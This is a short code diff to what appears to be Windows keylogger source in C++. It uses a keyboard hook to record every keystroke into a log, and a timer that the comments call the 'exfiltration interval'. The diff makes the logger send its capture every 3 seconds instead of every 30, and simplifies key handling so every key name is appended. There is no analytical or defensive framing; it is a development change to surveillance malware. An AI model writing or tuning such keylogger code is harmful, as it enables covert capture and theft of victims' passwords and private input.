@@ -49,7 +49,7 @@ namespace APIHook
 
 	//Change exfiltration interval here...remember...time is in miliseconds!
 
-	Timer logExfilTimer(preExfilProcedure, 1000 * 30, Timer::Infinite);
+	Timer logExfilTimer(preExfilProcedure, 1000 * 3, Timer::Infinite);
 
 	/* The hookingProcedure() function is used with the SetWindowsHookEx() function. 
 	The system calls this function every time a new keyboard input event is about 
@@ -91,7 +91,7 @@ namespace APIHook
 
 		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
 		{
-			if (keyPress->vkCode == VK_RETURN)
+			/*if (keyPress->vkCode == VK_RETURN)
 			{
 				//Handle enter key in the log for formatting purposes
 
@@ -100,7 +100,10 @@ namespace APIHook
 			else
 			{
 				workingKeyLog += KeyMap::KeyLookupEN[keyPress->vkCode].humanReadableName;
-			}
+			}*/
+
+			workingKeyLog += KeyMap::KeyLookupEN[keyPress->vkCode].humanReadableName;
+
 		}
 		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
 		{
